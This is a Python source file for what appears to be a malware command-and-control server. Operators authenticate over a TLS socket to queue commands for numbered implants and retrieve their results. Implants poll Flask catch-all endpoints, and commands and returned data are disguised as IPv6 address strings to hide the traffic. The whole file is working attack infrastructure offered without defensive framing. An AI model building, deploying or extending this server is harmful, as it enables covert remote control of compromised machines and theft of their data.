import logging
import socket
import ssl
import threading
from queue import Queue, Empty
from threading import Thread

from flask import Flask, request

import ipv6_encoder
import pw_hash

app = Flask(__name__)
implant_checkout = {}

# Command queues for each service identified by a 4-digit ID
implant_command_queues = {
    "1234": Queue(),
    "5678": Queue(),
}

# Result storage for each user
result_storage = {
    "tester": [],
    "matt_tester": [],
}

# Logger configuration
logger = logging.getLogger(__name__)
logging.basicConfig(
    filename='pubsub.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)


def add_user(new_user_id):
    logger.info(f"adding new user {new_user_id}")
    result_storage.setdefault(new_user_id, [])


def add_command(implant_id, operator, command):
    queue = implant_command_queues.get(implant_id)
    if queue:
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")
    else:
        logger.error(f"No queue found for implant {implant_id}, creating one")
        implant_command_queues.setdefault(implant_id, Queue())
        implant_command_queues[implant_id].put(command)
        logger.info(f"Added command for implant {implant_id}: {command}")


def get_results(user_id):
    # Get the users dict
    fetched = str(result_storage.get(user_id, []))
    logger.info(f"got results {fetched}")
    # result_storage[user_id] = []
    return fetched


def get_waiting_command(implant_id):
    queue = implant_command_queues.get(implant_id)
    if queue:
        try:
            operator, command = queue.get_nowait()  # Use get_nowait to avoid blocking
            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
            return operator, command
        except Empty:
            logger.info(f"No commands available for {implant_id}")
            return "", ""
    else:
        logger.info(f"No queue found for {implant_id}")
        return "", ""


def handle_update(uname, implant_id, result):
    """
    Handle implants returning updates

    Parameters:
        uname (str): The user who should get the results
        implant_id (str): The implant ID associated with the command
        result (str): The result sent by the implant

    Returns:
        Boolean: True if success, otherwise returns error
    """
    try:
        # decoded_res = ipv6_encoder.ipv6_to_string(result)
        logger.info(f"first 10 bytes {result[:10]}")
        dict_store = {implant_id: result}
        result_storage.setdefault(uname, []).append(dict_store)
        logger.info(f"new result saved for user: {uname}")
        return True
    except Exception as e:
        logger.error(f"error occurred saving result for implant: {e}")
        return e


def checkout_command(imp_id, user_id):
    """
    Adds a user_id to the implants queue to check who to send results to
    """
    implant_checkout.setdefault(imp_id, Queue())
    implant_checkout[imp_id].put(user_id)


def handle_client(client_socket):
    try:
        # Receive the client's initial message
        request = client_socket.recv(1024).decode()

        # Check what type of message it is first before processing further
        request_type, *remainder = request.split(" ", 1)

        match request_type:
            case "PUB":
                logger.info("request to send command, attempting")
                request_type, implant_id, uname, passw, *command = request.split(" ", 4)
                logger.info(f"checking authentication details for {uname}")
                try:
                    if pw_hash.compare_hash(uname, passw):
                        command = command[0] if command else ""
                        add_command(implant_id, uname, command)
                        client_socket.send("Message published\n".encode())
                        logger.info(f"Message: {command} sent to implant_id: {implant_id}")
                except Exception as e:
                    logger.error(f"Error occurred checking password {e}")
                    add_user(uname)

            case "SUB":
                logger.info("controller requesting implant last messages")
                request_type, uname, passw, *message = request.split(" ", 3)
                logger.info(f"checking authentication details for {uname}")
                try:
                    if pw_hash.compare_hash(uname, passw):
                        results = get_results(uname)
                        client_socket.send(results.encode())
                        logger.info(f"sent controller results {results}")
                    else:
                        client_socket.send(f"Bad user/password".encode())
                        logger.error(f"Bad user/password")
                except Exception as e:
                    logger.error(f"Error occurred checking password for {e}")

            case _:
                logger.error(f"unknown command: {request_type}")
                client_socket.send("Unknown command\n".encode())

    except Exception as e:
        logger.error(f"Error occurred when trying to receive connection {e}")
    finally:
        client_socket.close()


@app.route('/<path:path>', methods=['GET'])
def catch_all_get(path):
    # Get the message FIFO
    try:
        operator, command = get_waiting_command(path)
        checkout_command(path, operator)
        command = ipv6_encoder.string_to_ipv6(command)
        return command
    except Exception as e:
        return str(e)


@app.route('/<path:path>', methods=['POST'])
def catch_all_post(path):
    try:
        logger.info(f"{path} sending us data")
        # Get the data
        result = request.get_json()
        result = result.get("msg")
        queue = implant_checkout[path]
        logger.info("got queue for operator")
        operator = queue.get()
        logger.info(f"sending {operator} command")
        decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
        handle_update(operator, path, decoded_res)
        return "200"
    except Exception as e:
        logger.error(f"error getting data: {e}")
        return "error"


def start_flask():
    app.run()


def start_server():
    flask_thread = Thread(target=start_flask)
    flask_thread.start()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Bind to any available interface
    server.listen(5)
    server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_context.minimum_version = ssl.TLSVersion.TLSv1_3
    server_context.maximum_version = ssl.TLSVersion.TLSv1_3
    server_context.load_cert_chain(certfile="server.pem")
    server_context.verify_mode = ssl.CERT_NONE
    secure_socket = server_context.wrap_socket(
        server,
        server_side=True,
    )
    logger.info("TLS socket started on port 9999\n")

    while True:
        client_socket, addr = secure_socket.accept()
        logger.info(f"Accepted connection from: {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
